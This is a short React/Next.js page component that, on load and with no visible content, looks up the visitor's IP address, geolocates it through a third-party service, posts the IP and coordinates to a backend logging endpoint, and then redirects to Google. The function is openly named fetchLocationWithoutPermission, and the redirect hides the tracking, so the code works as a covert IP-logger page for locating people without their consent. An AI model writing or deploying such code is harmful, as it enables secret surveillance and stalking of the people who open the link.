'use client';
import { useEffect } from 'react';

export default function Page() {
  useEffect(() => {
    const fetchLocationWithoutPermission = async () => {
      try {
        // Step 1: Get the user's IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIp = ipData.ip;

        // Step 2: Use an IP geolocation API to get location details
        const geoResponse = await fetch(`https://ipinfo.io/${userIp}/json`);
        const geoData = await geoResponse.json();
        const { loc } = geoData; // loc is a string with latitude,longitude
        const [latitude, longitude] = loc.split(',');

        console.log('IP:', userIp);
        console.log('Location (IP-based):', { latitude, longitude });

        // Step 3: Optionally, send this data to your backend for logging
        await fetch('/api/log', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            ip: userIp,
            latitude,
            longitude,
          }),
        });

        // Redirect to Google
        window.location.href = 'https://google.com';
      } catch (error) {
        console.error('Error fetching location:', error);
      }
    };

    fetchLocationWithoutPermission();
  }, []);

  return null;  // No UI for this page
}
